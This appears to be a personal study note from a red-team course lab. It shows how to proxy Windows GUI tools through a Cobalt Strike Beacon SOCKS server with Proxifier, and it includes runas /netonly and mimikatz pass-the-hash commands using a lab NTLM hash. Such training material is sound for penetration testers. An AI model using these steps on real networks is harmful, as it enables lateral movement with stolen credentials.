---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Proxifier]]  
___

## Description:
We can tunnel GUI apps that run on Windows using a proxy client such as [Proxifier](https://www.proxifier.com/).

## Installation
Download free trial here  [Proxifier](https://www.proxifier.com/).

## Commands
To start a socks proxy, use `socks [port]` on a Beacon.

```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```
This will bind port 1080 on the Team Server.

Open **Proxifier**, go to **Profile > Proxy Servers** and **Add** a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.


Next, go to **Profile > Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Add the application you need and specify the target hosts (For example: 10.10.17.0/24).

 You may also need to add a static host entry in your `C:\Windows\System32\drivers\etc\hosts` file: `10.10.17.71 dev.cyberbotic.io`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.

Some applications (such as the RSAT tools) don't provide a means of providing a username or password, because they're designed to use a user's domain context. You can still run these tools on your attacking machine. If you have the clear text credentials, use `runas /netonly`.

```
C:\>runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
Enter the password for DEV\nlamb:
Attempting to start C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc as user "DEV\nlamb" ...
```

If you have an NTLM hash, use `sekurlsa::pth` to impersonate that user then use Proxifier

```
mimikatz # sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm:2e8a408a8aec852ef2e458b938b8c071 /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
user    : nlamb
domain  : dev.cyberbotic.io
program : C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc
impers. : no
NTLM    : 2e8a408a8aec852ef2e458b938b8c071


```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (09:25 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
